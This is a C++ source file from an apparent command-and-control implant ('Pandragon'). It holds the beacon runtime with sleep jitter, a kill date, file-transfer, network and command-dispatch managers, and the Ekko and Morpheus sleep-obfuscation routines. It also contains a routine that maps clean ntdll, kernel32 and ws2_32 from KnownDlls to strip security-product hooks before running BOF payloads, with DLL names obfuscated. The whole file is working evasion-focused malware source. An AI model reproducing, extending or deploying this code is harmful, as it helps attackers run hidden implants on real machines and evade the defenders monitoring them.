#include "../include/pandragon_runtime.h"
#include "../include/managers.h"
#include "../include/utils.h"
#include "../include/unhook.h"
#include "../include/sleep_obf.h"

/* ============================================================================
 * Global Function Table Pointer
 * ============================================================================ */

functionTable* g_functionTable = nullptr;

/* ============================================================================
 * Sleep Helper Functions
 * ============================================================================ */
#undef noinline

uint32_t ApplySleepJitter(uint32_t sleep_ms, uint8_t jitter_pct) {
    if (jitter_pct == 0 || jitter_pct > 100) {
        return sleep_ms;
    }

    uint64_t r = ___rdtsc();
    uint8_t random_factor = (r >> 8) & 0xFF;
    uint32_t jitter_range = (sleep_ms * jitter_pct) / 100;
    
    // Use int64_t to prevent overflow during intermediate calculation
    int64_t jitter_offset = (static_cast<int64_t>(random_factor) - 128) * static_cast<int64_t>(jitter_range) / 128;
    int64_t result = static_cast<int64_t>(sleep_ms) + jitter_offset;

    return (result < 1) ? 1 : static_cast<uint32_t>(result);
}
void ExecuteSleep(functionTable* funcTable, uint32_t sleep_ms, uint8_t jitter_pct) {
    PandragonRuntime& runtime = PandragonRuntime::getInstance();

    if(runtime.getSleepObfMethod() == SleepObfMethod::EKKO) {
        const BeaconConfig& configRef = runtime.getConfig();
        runtime.setSleepState(PandragonRuntime::SleepState::SLEEPING);
        if (SleepObf_Ekko(funcTable, &configRef, sleep_ms, jitter_pct)) {
            runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
            return;
        }
        /* Fallback to plain sleep if Ekko fails */
        g_debugPrint("[!] Ekko sleep obfuscation failed, falling back to plain Sleep");
        runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
    } else if (runtime.getSleepObfMethod() == SleepObfMethod::MORPHEUS){
        runtime.setSleepState(PandragonRuntime::SleepState::SLEEPING);
        if (SleepObf_Morpheus(funcTable, &runtime.getConfig(), sleep_ms, jitter_pct)) {
            runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
            return;
        }
        g_debugPrint("[!] Morpheus sleep obfuscation failed, falling back to plain Sleep");
        runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
   }

   funcTable->Sleep(ApplySleepJitter(sleep_ms, jitter_pct));
   runtime.setSleepState(PandragonRuntime::SleepState::AWAKE);
}

/* ============================================================================
 * PandragonRuntime Implementation
 * ============================================================================ */

PandragonRuntime& PandragonRuntime::getInstance() {
    static PandragonRuntime instance;
    return instance;
}

PandragonRuntime::PandragonRuntime()
    : m_funcTable(nullptr)
    , m_config()
    , m_sleepDuration(0)
    , m_jitterPercent(0)
    , m_sleepObfMethod(SleepObfMethod::NONE)
    , m_initialized(false)
    , m_killDate(0)
    , m_fileTransferManager(nullptr)
    , m_networkManager(nullptr)
    , m_commandDispatcher(nullptr)
    , m_sleepState(SleepState::AWAKE)
    , m_phantomNtdllBase(nullptr)
    , m_ntdllUnhooked(false)
{
    __memset(&m_config, 0, sizeof(m_config));
}

BeaconError PandragonRuntime::initialize(functionTable* funcTable) {
    g_debugPrint("[PandragonRuntime::initialize] ENTER: funcTable=%p", (void*)funcTable);
    
    if (!funcTable) {
        return BeaconError::INVALID_PARAMETER;
    }

    m_funcTable = funcTable;
    g_functionTable = funcTable;

    // Initialize managers using __malloc (freestanding-compatible)
    g_VERBOSE("[PandragonRuntime::initialize] Allocating FileTransferManager...");
    m_fileTransferManager  = reinterpret_cast<FileTransferManager*>(
        __malloc(sizeof(FileTransferManager)));
    g_VERBOSE("[PandragonRuntime::initialize] FileTransferManager allocated at %p", (void*)m_fileTransferManager);
    
    g_VERBOSE("[PandragonRuntime::initialize] Allocating NetworkManager...");
    m_networkManager       = reinterpret_cast<NetworkManager*>(
        __malloc(sizeof(NetworkManager)));
    g_VERBOSE("[PandragonRuntime::initialize] NetworkManager allocated at %p", (void*)m_networkManager);
    
    g_VERBOSE("[PandragonRuntime::initialize] Allocating CommandDispatcher...");
    m_commandDispatcher    = reinterpret_cast<CommandDispatcher*>(
        __malloc(sizeof(CommandDispatcher)));
    g_VERBOSE("[PandragonRuntime::initialize] CommandDispatcher allocated at %p", (void*)m_commandDispatcher);

    if (!m_fileTransferManager || !m_networkManager || !m_commandDispatcher) {
        g_debugPrint("[PandragonRuntime::initialize] Allocation failed!");
        return BeaconError::ALLOCATION_FAILED;
    }

    // Placement new for construction
    g_VERBOSE("[PandragonRuntime::initialize] Constructing FileTransferManager...");
    new (m_fileTransferManager) FileTransferManager();
    g_VERBOSE("[PandragonRuntime::initialize] FileTransferManager constructed");
    
    g_VERBOSE("[PandragonRuntime::initialize] Constructing NetworkManager...");
    new (m_networkManager) NetworkManager();
    g_VERBOSE("[PandragonRuntime::initialize] NetworkManager constructed");
    
    g_VERBOSE("[PandragonRuntime::initialize] Constructing CommandDispatcher...");
    new (m_commandDispatcher) CommandDispatcher();
    g_VERBOSE("[PandragonRuntime::initialize] CommandDispatcher constructed");

    m_fileTransferManager->initialize();
    g_VERBOSE("[PandragonRuntime::initialize] FileTransferManager initialized");
    
    m_commandDispatcher->initializeBuiltInHandlers();
    g_VERBOSE("[PandragonRuntime::initialize] CommandDispatcher handlers initialized");

    m_initialized.store(true, std::memory_order_release);
    g_debugPrint("[PandragonRuntime::initialize] EXIT: SUCCESS");
    return BeaconError::SUCCESS;
}

void PandragonRuntime::shutdown() {
    if (m_fileTransferManager) {
        m_fileTransferManager->~FileTransferManager();
        __free(m_fileTransferManager);
        m_fileTransferManager = nullptr;
    }
    if (m_networkManager) {
        m_networkManager->~NetworkManager();
        __free(m_networkManager);
        m_networkManager = nullptr;
    }
    if (m_commandDispatcher) {
        __free(m_commandDispatcher);
        m_commandDispatcher = nullptr;
    }
    m_initialized.store(false, std::memory_order_release);
}

/* ============================================================================
 * Lazy Unhook Implementation
 * ============================================================================ */

bool PandragonRuntime::ensureUnhooked() {
    // Already unhooked
    if (m_ntdllUnhooked.load(std::memory_order_acquire)) {
        return true;
    }

    // Config doesn't have lazy_unhook enabled; never unhook
    if (!m_config.options.lazy_unhook) {
        return false;
    }

    // First time: map clean DLLs from KnownDlls
    g_debugPrint("[lazy_unhook] First BOF exec... mapping clean DLLs from KnownDlls...");

    // Map ntdll (primary for unhooking)
    void* cleanBase = MapKnownDll(m_funcTable, lcg_encrypt("ntdll"));
    if (!cleanBase) {
        g_debugPrint("[lazy_unhook] Failed to map ntdll from KnownDlls... proceeding with hooked ntdll");
        return false;
    }

    // Optionally map additional DLLs for BOFs that need them
    // Map kernel32 (for CreateRemoteThread, VirtualAllocEx, etc in BOFs)
    void* kernel32Base = MapKnownDll(m_funcTable, lcg_encrypt("kernel32"));
    if (kernel32Base) {
        g_debugPrint("[lazy_unhook] Mapped clean kernel32 at 0x%p", kernel32Base);
    }

    // Map ws2_32 (for socket operations in BOFs)
    void* ws2_32Base = MapKnownDll(m_funcTable, lcg_encrypt("ws2_32"));
    if (ws2_32Base) {
        g_debugPrint("[lazy_unhook] Mapped clean ws2_32 at 0x%p", ws2_32Base);
    }

    m_phantomNtdllBase.store(cleanBase, std::memory_order_release);
    m_ntdllUnhooked.store(true, std::memory_order_release);
    g_debugPrint("[lazy_unhook] DLLs unhooked successfully via KnownDlls");
    return true;
}
